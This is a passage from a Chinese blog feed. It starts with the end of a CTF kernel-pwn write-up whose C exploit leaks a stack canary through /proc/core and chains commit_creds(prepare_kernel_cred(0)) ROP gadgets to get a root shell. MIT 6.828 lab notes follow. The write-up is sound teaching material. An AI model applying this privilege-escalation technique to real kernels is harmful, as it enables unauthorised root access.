alt="image-20210306154532756"></p><p>可以看到我们的canary放到的<code>rsp+40</code>的地方，接下来是<code>rbp</code>和<code>ret</code>，我们设置core_read中的<code>off</code>为<code>0x40</code>就能将canary泄露出来。</p><p>由于开启的kaslr，我们就需要泄露base基址，得到真实的gadget地址。</p><p>我们可以先用gadget和预设的vmlinux基地址间的偏移，然后用偏移加上真实的内核基地址后就可以得到真实的gadget地址。</p><p>我们可以用下面的脚本来计算偏移值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * elf = ELF(<span class="string">&#x27;./fs/vmlinux&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;commit_creds&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;commit_creds&#x27;</span>]-<span class="number">0xffffffff81000000</span>) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;prepare_kernel_cred&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>]-<span class="number">0xffffffff81000000</span>)</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247936576/0" alt="image-20210306155559515"></p><p>对于真实的基地址我们可以通过读取<code>kallsyms</code>文件来读取</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE* base=popen(<span class="string">&quot;grep startup_64 /tmp/kallsyms |awk -F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>); <span class="built_in">fscanf</span>(base,<span class="string">&quot;%p&quot;</span>,&amp;base_addr);</span><br></pre></td></tr></table></figure><p>接下来就是找gadget。                                                                                                                                                                                   </p><p>这里找gadget有一个非常非常非常非常坑的点就是要用bzImage提取出来的vmlinux来找，别问为什么。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p>然后用ropper搜gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ropper --file vmlinux --nocolor &gt; rop.txt</span><br></pre></td></tr></table></figure><p>然后我们搜索需要用到的gadget</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248163635/0" alt="image-20210306161241929"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248011591/0" alt="image-20210306161302892"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248012580/0" alt="image-20210306161318986"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248013485/0" alt="image-20210306161334561"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248016467/0" alt="image-20210306161420691"></p><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>ROP如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop rdi;ret</span><br><span class="line">0;</span><br><span class="line">prepare_kernel_cred</span><br><span class="line">pop rdx,ret;</span><br><span class="line">commit_creds</span><br><span class="line">mov rdi,rax;call rdx</span><br><span class="line">swapgs;popfq;ret</span><br><span class="line">0</span><br><span class="line">iretq;ret</span><br><span class="line">system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure><p>我们需要注意的一点就是rop在iretq时，会依次弹出rip、cs、rflags、sp、ss之后做一些判断，如果不能构造好这些参数，系统就会崩溃，所以我们提前写个函数将这些参数保存起来。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">__asm__(</span><br><span class="line"><span class="string">&quot;mov user_cs, cs;&quot;</span>            </span><br><span class="line"><span class="string">&quot;mov user_ss, ss;&quot;</span>            </span><br><span class="line"><span class="string">&quot;mov user_sp, rsp;&quot;</span>            </span><br><span class="line"><span class="string">&quot;pushf;&quot;</span>            </span><br><span class="line"><span class="string">&quot;pop user_rflags;&quot;</span>            </span><br><span class="line">);    </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>); </span><br><span class="line">&#125; <span class="comment">//这种汇编写法，编译的时候需要加上 -masm=intel</span></span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binsh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">void</span>* commit_creds;</span><br><span class="line">    <span class="keyword">void</span>* base_addr;</span><br><span class="line">    <span class="keyword">void</span>* prepare_kernel_cred;</span><br><span class="line">    </span><br><span class="line">    FILE* base=popen(<span class="string">&quot;grep startup_64 /tmp/kallsyms |awk -F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fscanf</span>(base,<span class="string">&quot;%p&quot;</span>,&amp;base_addr);</span><br><span class="line">    commit_creds=base_addr+<span class="number">0x9c8e0</span>;</span><br><span class="line">    prepare_kernel_cred=base_addr+<span class="number">0x9cce0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds is %p \nbase is %p \nprepare is %p\n&quot;</span>,commit_creds,base_addr,prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line">    fclose(base);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_WRONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open core failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>); <span class="comment">//set offset</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> canary[<span class="number">2</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,canary); <span class="comment">//get canary</span></span><br><span class="line">    <span class="comment">//printf(&quot;ret addr is %lx\n&quot;,canary[2]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary is %lx\n&quot;</span>,canary[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]ebp is %p\n&quot;</span>,canary[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> payload[<span class="number">0x40</span>];</span><br><span class="line">payload[<span class="number">0</span>]=<span class="number">0x6666666666666666</span>;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">8</span>]=canary[<span class="number">0</span>]; <span class="comment">//canary</span></span><br><span class="line">    payload[<span class="number">9</span>]=canary[<span class="number">1</span>]; <span class="comment">//rbp</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mov_rdi_rax_jmp_rdx=base_addr+<span class="number">0x6a6d2</span>;</span><br><span class="line">    <span class="keyword">void</span>* pop_rdx_ret=base_addr+<span class="number">0xa0f49</span>;</span><br><span class="line">    <span class="keyword">void</span>* pop_rdi_ret=base_addr+<span class="number">0xb2f</span>;</span><br><span class="line">    <span class="keyword">void</span>* swapgs=base_addr+<span class="number">0xa012da</span>;</span><br><span class="line">    <span class="keyword">void</span>* iretq=base_addr+<span class="number">0x50ac2</span>;</span><br><span class="line"></span><br><span class="line">    payload[<span class="number">10</span>] = pop_rdi_ret; <span class="comment">//pop rdi;ret</span></span><br><span class="line">    payload[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">12</span>] = prepare_kernel_cred; <span class="comment">//prepare_kernel_cred(0);</span></span><br><span class="line">    payload[<span class="number">13</span>] = pop_rdx_ret; <span class="comment">//pop rdx;ret</span></span><br><span class="line">    payload[<span class="number">14</span>] = commit_creds; <span class="comment">//commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    payload[<span class="number">15</span>] = mov_rdi_rax_jmp_rdx; <span class="comment">//mov rdi, rax; call rdx;</span></span><br><span class="line">    payload[<span class="number">16</span>] = swapgs; <span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">18</span>] = iretq; <span class="comment">//iretq; ret; </span></span><br><span class="line">    payload[<span class="number">19</span>] = binsh;</span><br><span class="line">    payload[<span class="number">20</span>] = user_cs;</span><br><span class="line">    payload[<span class="number">21</span>] = user_rflags;</span><br><span class="line">    payload[<span class="number">22</span>] = user_sp;</span><br><span class="line">    payload[<span class="number">23</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,payload,<span class="number">0x200</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xf000000000000000</span>+<span class="number">24</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248098511/0" alt="image-20210306163253674"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h2&gt;&lt;p&gt;首先到手几个文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/1324754
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="Kernel Pwn" scheme="https://billyotry.github.io/tags/Kernel-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise12</title>
    <link href="https://billyotry.github.io/2021/03/05/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise12/"/>
    <id>https://billyotry.github.io/2021/03/05/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise12/</id>
    <published>2021-03-05T02:54:09.075Z</published>
    <updated>2021-03-05T02:59:36.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>实现<code>backtrace</code>命令</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们需要查询STAB（Symbol TABLE）的知识来完成此内容</p><p>在<code>kdebug.c</code>中添加如下片段来获取函数行号：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line">info-&gt;eip_line = stabs[lline].n_desc;</span><br></pre></td></tr></table></figure><p>在<code>monitor.c</code>中添加<code>backtrace</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span>* ebp = (<span class="keyword">int</span> *)read_ebp();</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(ebp)&#123;</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x&quot;</span>,ebp);</span><br><span class="line">        cprintf(<span class="string">&quot;  eip %08x&quot;</span>,*(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;  args&quot;</span>);</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">4</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">5</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x\n&quot;</span>,*(ebp+<span class="number">6</span>));</span><br><span class="line">        ebp = (<span class="keyword">int</span>*) *ebp;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> *<span class="title">info</span>;</span></span><br><span class="line">        <span class="keyword">int</span> eip = *(ebp+<span class="number">1</span>);</span><br><span class="line">        debuginfo_eip(eip,&amp;info);</span><br><span class="line">        cprintf(<span class="string">&quot;\t%s:%d: %.*s+%d\n&quot;</span>, </span><br><span class="line">      info.eip_file, info.eip_line,</span><br><span class="line">      info.eip_fn_namelen, info.eip_fn_name,</span><br><span class="line">      eip-info.eip_fn_addr);</span><br><span class="line">        ebp = (<span class="keyword">int</span>*)*ebp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;实现&lt;code&gt;backtrace&lt;/code&gt;命令&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise11</title>
    <link href="https://billyotry.github.io/2021/02/28/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise11/"/>
    <id>https://billyotry.github.io/2021/02/28/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise11/</id>
    <published>2021-02-28T13:13:11.198Z</published>
    <updated>2021-02-28T13:20:47.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>完成<code>mon_backtrace()</code>函数</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们可以利用课程提供给我们的<code>read_ebp()</code>函数来获取此时的ebp，不过要注意的是他返回的是<code>int</code>类型，接下来就是简单的指针操作了。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">mon_backtrace(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span>* ebp = (<span class="keyword">int</span> *)read_ebp();</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(ebp)&#123;</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x&quot;</span>,ebp);</span><br><span class="line">        cprintf(<span class="string">&quot;  eip %08x&quot;</span>,*(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;  args&quot;</span>);</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">4</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x&quot;</span>,*(ebp+<span class="number">5</span>));</span><br><span class="line">        cprintf(<span class="string">&quot; %08x\n&quot;</span>,*(ebp+<span class="number">6</span>));</span><br><span class="line">        ebp = (<span class="keyword">int</span>*) *ebp;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果图如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13223233811/0" alt="image-20210228211804240"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;完成&lt;code&gt;mon_backtrace()&lt;/code&gt;函数&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise9</title>
    <link href="https://billyotry.github.io/2021/02/03/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise9/"/>
    <id>https://billyotry.github.io/2021/02/03/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise9/</id>
    <published>2021-02-03T13:01:28.146Z</published>
    <updated>2021-02-03T14:33:47.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针又是指向这块被保留的区域的哪一端的呢？</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间"><a href="#1-首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间" class="headerlink" title="1.首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间"></a>1.首先判断操作系统内核是从哪条指令开始初始化它的堆栈空间</h3><p>前面以及分析过boot.S和main.c文件的运行过程，这个文件中的代码是PC启动后，BIOS运行完成后，首先执行的两部分代码。但是它们并不属于操作系统的内核。当main.c的最后一条指令讲处理器的控制权交给entry.S时，此时才真正进入操作系统内核。其实我们能发现，在进入entry之前，并没有对于%esp，%ebp寄存器的内容的修改，所以在bootmain中并没有初始化堆栈空间的语句。</p><p>下面进入entry.S，在entry.S中我们可以看到它最后一条指令是要调用i386_init()子程序。这个子程序位于init.c文件之中。在这个程序中已经开始对操作系统进行一些初始化工作，并且自重进入mointor函数。可见到i386_init子程序时，内核的堆栈应该已经设置好了。<strong>所以设置内核堆栈的指令就应该是entry.S中位于 call i386_init 指令之前的两条语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movl$0x0,%ebp# nuke frame pointer</span><br><span class="line">movl$(bootstacktop),%esp # Set the stack pointer</span><br></pre></td></tr></table></figure><p>这两条指令修改了%ebp，%esp两个寄存器的值，而这两个寄存器的值和堆栈息息相关。</p><h3 id="2-这个堆栈坐落在内存的什么地方"><a href="#2-这个堆栈坐落在内存的什么地方" class="headerlink" title="2.这个堆栈坐落在内存的什么地方"></a>2.这个堆栈坐落在内存的什么地方</h3><p>首先我们好好分析以下entry.S。</p><p>首先我们配置好一个qemu，gdb调试环境，现在我们首先在gdb中设置一个断点（指令: b *0x7d6b），就设置到马上进入entry之前，然后一步步进行调试。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129479702/0" alt="image-20210203215417909"></p><p>当我们准备运行entry.S中第一条指令 movx $0x1234, 0x472 时，指令地址是0x10000C，如上图所示。这个比较好理解，因为在bootmain里面，我们已经把操作系统的内核文件全部加载到物理内存0x100000处了。所以0x10000C是系统内核的第一条指令所在的物理地址处。而当我们继续运行运行到jmp *%eax之后，后面的指令地址就都变化了，变换为：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129481847/0" alt="image-20210203215451095"></p><p>图中的地址是0xf010002f，很明显这是一个虚拟地址，它的真实地址应该是0x0010002f，因为所有的内核代码都实际存放在这个内存区域中。之所以现在要把指令地址设置为0xf010002f，即把操作系统的代码的虚拟地址设置为从0xf0100000开始。目的就是能够让程序员在编程时，能够利用虚拟地址空间的低地址空间。如果它编写的程序调用了操作系统的代码，则操作系统代码的虚拟地址一定位于高地址空间0xf0100000处。这样非常有利于程序员写程序。</p><p>　　所以必须有一种机制能够实现，即便程序员在程序中指定的操作系统的代码的虚拟地址在0xf0100000高地址空间，但是我们这个机制也能够把这个高地址转换为这个代码真实的在内存中的位置。比如上图中，我们想访问0xf010002f处的指令，这是个虚拟地址，当实际运行时，会有一种机制把这个地址转换为真实地址0x0010002f。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 　　movl    $(RELOC(entry_pgdir)), %eax</span><br><span class="line">2 　　movl    %eax, %cr3</span><br><span class="line">3 　　movl    %cr0, %eax</span><br><span class="line">4 　　orl    $(CR0_PE|CR0_PG|CR0_WP), %eax</span><br><span class="line">5 　　movl    %eax, %cr0</span><br></pre></td></tr></table></figure><p>这个机制的实现方式是通过写一个C语言的页表，enrty_pgdir，这个手写的页表可以自动把[0xf0000000-0xf0400000]这4MB的虚拟地址空间映射为[0x00000000-0x00400000]的物理地址空间。可见这个页表的映射能力还是比较有限的，只能映射一个区域。对于当前执行的这些指令，这个映射空间就已经足够了。因为当前运行的是内核程序，他们的虚拟空间地址范围在[0xf0000000-0xf0400000]之内。但是当操作系统真正正常的运行起来的时候，这个映射就不够用了。必须采用更全面的，也就是在lab 2中要介绍的页表机制。所以当操作系统真正正常运行起来时，entry_pgdir这个页表将不会再使用。</p><p>首先第1句讲entry_pgdir这个页表的起始物理地址送给%eax，这里RELOC宏的功能是计算输入参数的物理地址。第2句将entry_pgdir这个页表的起始物理地址送给%cr3寄存器。控制寄存器cr2和cr3都是和分页机制相关的寄存器。其中cr3寄存器存放页表的物理起始地址。第3~5句，修改cr0寄存器的值，<strong>把cr0的PE位，PG位, WP位都置位1。其中PE位是启用保护标识位，如果被置1代表将会运行在保护模式下。PG位是分页标识位，如果这一位被置1，则代表开启了分页机制。WP位是写保护标识，如果被置位为1，则处理器会禁止超级用户程序向用户级只读页面执行写操作</strong>。</p><p>这条指令过后，就开始工作在具有分页机制的模式之下了。接下来的指令就可以指定[0xf0000000-0xf0400000]范围的指令了。</p><p>然后下面两条指令就把当前运行程序的地址空间提高到[0xf0000000-0xf0400000]范围内。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1     mov    $relocated, %eax</span><br><span class="line">2     jmp    *%eax</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13129512736/0" alt="image-20210203220213503"></p><p>可见relocated的值为0xf010002f。此时分页系统会把这个虚拟地址，转换为真实的物理地址。</p><p>接下来就是最关键的两句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1     movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line">2     movl    $(bootstacktop),%esp # Set the stack pointer</span><br><span class="line">3     call    i386_init</span><br></pre></td></tr></table></figure><p>这两个指令分别设置了%ebp，%esp两个寄存器的值。其中%ebp被修改为0。%esp则被修改为bootstacktop的值。这个值为0xf0110000。另外在entry.S的末尾还定义了一个值，bootstack。注意，在数据段中定义栈顶bootstacktop之前，首先分配了KSTKSIZE这么多的存储空间，专门用于堆栈，这个KSTKSIZE = 8 * PGSIZE = 8 * 4096 = 32KB。<strong>所以用于堆栈的地址空间为 0xf0108000-0xf0110000，其中栈顶指针指向0xf0110000. 那么这个堆栈实际坐落在内存的 0x00108000-0x00110000物理地址空间中。</strong></p><h3 id="3-内核是如何给它的堆栈保留一块空间的"><a href="#3-内核是如何给它的堆栈保留一块空间的" class="headerlink" title="3.内核是如何给它的堆栈保留一块空间的"></a>3.内核是如何给它的堆栈保留一块空间的</h3><p>其实就是通过刚刚分析的，在entry.S中的数据段里面声明一块大小为32Kb的空间作为堆栈使用。从而为内核保留了一块空间。</p><h3 id="4-堆栈指针又是如何指向被保留的区域的哪一端的呢"><a href="#4-堆栈指针又是如何指向被保留的区域的哪一端的呢" class="headerlink" title="4.堆栈指针又是如何指向被保留的区域的哪一端的呢"></a>4.堆栈指针又是如何指向被保留的区域的哪一端的呢</h3><p>堆栈由于是由高到低生长的，所以堆栈指针自然要指向最高地址了。最高地址就是我们之前看到的bootstacktop的值。所以将会把这个值赋给堆栈指针寄存器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h2&gt;&lt;p&gt;判断一下操作系统内核是从哪条指令开始初始化它的堆栈空间的，以及这个堆栈坐落在内存的哪个地方？内核是如何给它的堆栈保留一块内存空间的？堆栈指针
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT6.828】Lab1-Exercise8</title>
    <link href="https://billyotry.github.io/2021/02/02/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise8/"/>
    <id>https://billyotry.github.io/2021/02/02/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise8/</id>
    <published>2021-02-02T09:34:23.829Z</published>
    <updated>2021-02-02T16:30:38.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>我们丢弃了一小部分代码—即当我们在printf中指定输出”%o”格式的字符串，即八进制格式的代码。尝试去完成这部分程序。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在这个练习中我们首先要阅读三个源文件之间的代码，弄清楚他们三者之间的关系。他们是<code>/kern/printf.c，/kern/console.c, /lib/printfmt.c</code></p><p>首先大致浏览三个源文件，大致观察到：</p><ol><li>printf.c中的cprintf调用了vcprintf，然后vcprintf调用了printffmt.c中的vprintfmt。</li><li>printf.c中的putch调用了console.c中的cputchar，cputchar调用了cons_putc。</li><li>printfmt.c中的某些程序也依赖于cputchar。</li></ol><p>所以printf.C，printfmt.c的功能依赖于console.c的功能。所以我们先探讨下console.c。</p><h3 id="kern-console-c"><a href="#kern-console-c" class="headerlink" title="/kern/console.c"></a>/kern/console.c</h3><p>这个文件中定义了把一个字符显示到console上，即我们的显示屏上，里面包括了很多对IO端口的操作。</p><p>其中我们最感兴趣的<code>cputchar</code>函数。从注释中我们知道这个是最高处的console的IO控制程序，<code>cputchar</code>的实现其实是通过调用<code>cons_putc</code>实现的。</p><p><code>cons_putc</code>的功能是输出一个字符到控制台（计算机的屏幕），所以<code>cputchar</code>的功能也是想屏幕上输出一个字符。然后我们具体看下<code>cons_putc</code>函数，<code>cons_putc</code>包含三个函数。</p><p>首先是<code>serial_putc</code>函数：其中包括了一些IO端口程序，通过代码的宏定义我们知道他是在控制0x3f8端口，这个端口在我们之前的网站中可以查到，它是属于控制计算机中的串口。我们在观察一下函数中的inb指令和outb指令，他们分别控制两个端口，<code>COM1+COM_LSR = 0x3f8 + 5 = 0x3fd</code>和 <code>COM1 + COM_TX = 0x3f8 + 0 = 0x3f8</code>端口。inb指令是读取<code>0x3fd</code>端口，即line status 